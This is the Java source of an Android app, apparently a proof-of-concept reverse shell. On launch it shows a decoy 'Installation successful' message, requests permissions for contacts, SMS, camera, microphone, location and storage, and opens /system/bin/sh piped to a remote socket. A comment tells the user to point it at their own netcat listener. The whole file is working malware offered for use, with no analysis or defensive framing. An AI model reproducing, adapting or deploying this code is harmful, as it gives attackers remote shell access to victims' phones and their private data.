package com.android.simplereverseshell;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView text = new TextView(this);
        setContentView(text);
        //Add some boilerplate text
        text.setText("Installation successful, " +
                "Do not close the application!");

        int PERMISSION_ALL = 1;
        String[] PERMISSIONS = {
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.WRITE_CONTACTS,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.ACCESS_NETWORK_STATE,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.INTERNET,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.SET_WALLPAPER,
                android.Manifest.permission.CAMERA
        };

        if (!hasPermissions(this, PERMISSIONS)) {
            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
        }

        new Thread(new Runnable(){
            @Override
            public void run() {
                try {
                    System.out.println("Attepting to connect");
                    reverseShell();
                } catch (Exception e) {
                    Log.e("Error", e.getMessage());
                }
            }

        }).start();

    }

    public static boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }


    public void reverseShell() throws Exception {

        final Process process = Runtime.getRuntime().exec("system/bin/sh");

        //change your nc listener host address and port.
        Socket socket = new Socket("127.0.0.1", 1234);

        forwardStream(socket.getInputStream(), process.getOutputStream());
        forwardStream(process.getInputStream(), socket.getOutputStream());
        forwardStream(process.getErrorStream(), socket.getOutputStream());
        process.waitFor();

        socket.getInputStream().close();
        socket.getOutputStream().close();

    }


    private static void forwardStream(final InputStream input, final OutputStream output) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    final byte[] buf = new byte[4096];
                    int length;
                    while ((length = input.read(buf)) != -1) {
                        if (output != null) {
                            output.write(buf, 0, length);
                            if (input.available() == 0) {
                                output.flush();
                            }
                        }
                    }
                } catch (Exception e) {

                } finally {
                    try {
                        input.close();
                        output.close();
                    } catch (IOException e) {

                    }
                }
            }
        }).start();
    }
}
